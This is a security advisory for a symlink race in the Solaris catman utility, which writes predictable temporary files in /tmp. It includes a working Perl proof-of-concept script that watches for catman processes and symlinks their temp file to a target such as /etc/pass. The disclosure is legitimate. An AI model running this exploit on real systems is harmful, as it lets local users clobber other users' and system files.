source: http://www.securityfocus.com/bid/2149/info
 
catman is a utility for creating preformatted man pages, distributed as part of the Solaris Operating Environment. A problem exists which could allow local users to overwrite or corrupt files owned by other users.
 
The problem occurs in the creation of temporary files by the catman program. Upon execution, catman creates files in the /tmp directory using the file name sman_<pid>, where pid is the Process ID of the running catman process. The creation of a symbolic link from /tmp/sman_<pid> to a file owned and writable by the user executing catman will result in the file being overwritten, or in the case of a system file, corrupted. This makes it possible for a user with malicious intent to overwrite or corrupt files owned by other users, and potentially overwrite or corrupt system files. The Sun BugID for this issue is 4392144. 

#!/usr/local/bin/perl -w 
# The problem is catman creates files in /tmp insecurly. They are based on the PID of the catman
# process,  catman will happily clobber any files that are symlinked to that file.
# The idea of this script is to watch the process list for the catman process, 
# get the pid and Create a symlink in /tmp to our file to be
# clobbered.  This exploit depends on system speed and process load.   
# This worked on a patched Solaris 2.7 box (August 2000 patch cluster)
# SunOS rootabega 5.7 Generic_106541-12 sun4u sparc SUNW,Ultra-1
# lwc@vapid.betteros.org   11/21/2000   Vapid Labs.
# http://vapid.betteros.org



$clobber = "/etc/pass";
while(1) {
open ps,"ps -ef | grep -v grep |grep -v PID |";

while(<ps>) {
@args = split " ", $_;

if (/catman/) { 
        print "Symlinking sman_$args[1] to  $clobber\n";
        symlink($clobber,"/tmp/sman_$args[1]");
        exit(1);
   }
 }

}

